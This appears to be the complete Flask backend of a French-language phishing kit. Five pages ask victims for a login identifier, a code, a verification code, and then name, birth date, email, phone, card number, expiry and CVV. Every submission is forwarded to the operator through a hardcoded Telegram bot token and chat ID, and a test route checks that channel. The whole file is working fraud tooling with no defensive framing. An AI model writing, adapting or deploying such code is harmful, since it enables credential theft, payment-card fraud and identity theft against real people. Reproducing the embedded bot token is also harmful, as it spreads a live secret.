from flask import Flask, render_template, request, redirect, url_for
import requests

app = Flask(__name__)

# --- Configuration Telegram ---
BOT_TOKEN = "8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A"
CHAT_ID = "6297861735"

def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {'chat_id': CHAT_ID, 'text': message}
    response = requests.post(url, data=payload)
    if response.status_code != 200:
        print(f"[❌] Erreur Telegram : {response.text}")
    else:
        print("[✅] Message Telegram envoyé !")

# --- Données utilisateur temporaire ---
user_data = {}

# --- Page 1 : Identifiant ---
@app.route('/', methods=['GET', 'POST'])
def identifiant():
    if request.method == 'POST':
        identifiant = request.form.get('identifiant', '').strip()
        if identifiant:
            user_data['identifiant'] = identifiant
            send_to_telegram(f"🔑 Identifiant : {identifiant}")
            return redirect(url_for('code'))  # Page 2
    return render_template('identifiant.html')

# --- Page 2 : Code ---
@app.route('/code', methods=['GET', 'POST'])
def code():
    if request.method == 'POST':
        code = request.form.get('code', '').strip()
        if code:
            user_data['code'] = code
            send_to_telegram(f"🔐 Code : {code}")
            return redirect(url_for('validation'))  # Page 3
    return render_template('code.html')

# --- Page 3 : Validation ---
@app.route('/validation', methods=['GET', 'POST'])
def validation():
    if request.method == 'POST':
        validation = request.form.get('validation', '').strip()
        if validation:
            user_data['validation'] = validation
            send_to_telegram(f"📲 Validation : {validation}")
            return redirect(url_for('informations'))  # Page 4
    return render_template('validation.html')

# --- Page 4 : Informations ---
@app.route('/informations', methods=['GET', 'POST'])
def informations():
    if request.method == 'POST':
        nom = request.form.get('nom', '').strip()
        naissance = request.form.get('naissance', '').strip()
        email = request.form.get('email', '').strip()
        telephone = request.form.get('telephone', '').strip()
        carte = request.form.get('carte', '').strip()
        expiration = request.form.get('expiration', '').strip()
        cvv = request.form.get('cvv', '').strip()

        message = (
            f"👤 Nom complet : {nom}\n"
            f"🎂 Date de naissance : {naissance}\n"
            f"📧 Email : {email}\n"
            f"📞 Téléphone : {telephone}\n"
            f"💳 Carte : {carte}\n"
            f"📅 Expiration : {expiration}\n"
            f"🔒 CVV : {cvv}"
        )
        send_to_telegram(message)

        return redirect(url_for('merci'))  # Page 5

    return render_template('informations.html')

# --- Page 5 : Merci ---
@app.route('/merci')
def merci():
    return render_template('remerciement.html')

# --- Test Telegram ---
@app.route('/test-telegram')
def test_telegram():
    send_to_telegram("✅ Test Telegram depuis Flask réussi !")
    return "Test envoyé avec succès."

# --- Lancement ---
if __name__ == '__main__':
    app.run(debug=True)
